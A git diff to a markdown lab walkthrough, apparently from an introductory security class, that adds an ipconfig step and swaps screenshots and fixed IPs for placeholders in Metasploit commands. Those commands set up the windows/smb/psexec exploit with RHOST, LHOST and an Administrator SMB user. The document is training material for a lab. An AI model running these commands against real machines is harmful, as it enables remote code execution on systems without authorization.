@@ -114,6 +114,15 @@ It should look like this:
 
 <img width="718" height="130" alt="2026-02-23_13-31" src="https://github.com/user-attachments/assets/0e82b469-9b03-43f6-a16d-9fab7c1ac38d" />
 
+- Now get you **Windows IP**:
+
+```ps
+ipconfig
+```
+
+<img width="639" height="154" alt="Get_IpWIN" src="https://github.com/user-attachments/assets/ad0b348b-cc4f-40e3-9625-c9bbc42e3e0a" />
+
+
 Now, let's open a Linux terminal:
 
 - **Double-click** `Ubuntu Shell` on Desktop
@@ -134,7 +143,8 @@ Start Metasploit
 msfconsole -q
 ```
 
-<img width="770" alt="image" src="https://github.com/user-attachments/assets/d32ecb85-5873-478a-b270-fbaf33e11aec">
+<img width="577" height="91" alt="msfconsolebash" src="https://github.com/user-attachments/assets/7078dce4-0385-40fe-a7a5-6852d28a30bf" />
+
 
 In another Linux terminal, get your IP address
 
@@ -142,14 +152,15 @@ In another Linux terminal, get your IP address
 ifconfig
 ```
 
-<img width="661" alt="image" src="https://github.com/user-attachments/assets/44e622e5-34b6-4f0e-8547-769e891152e5">
+<img width="716" height="175" alt="Get_IP" src="https://github.com/user-attachments/assets/cc1893c9-3a96-4ddb-a16a-45f0bdad0e10" />
+
 
 msf6 > `use exploit/windows/smb/psexec`
 
 
-msf6 exploit(windows/smb/psexec) > `set RHOST 10.10.70.106`
+msf6 exploit(windows/smb/psexec) > `set RHOST <Windows IP>`
 
-msf6 exploit(windows/smb/psexec) > `set LHOST 10.10.117.128`
+msf6 exploit(windows/smb/psexec) > `set LHOST <Linux IP>`
 
 
 msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`
@@ -217,6 +228,7 @@ Please be sure to destroy the lab environment!
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
 ---
+
 
 
 
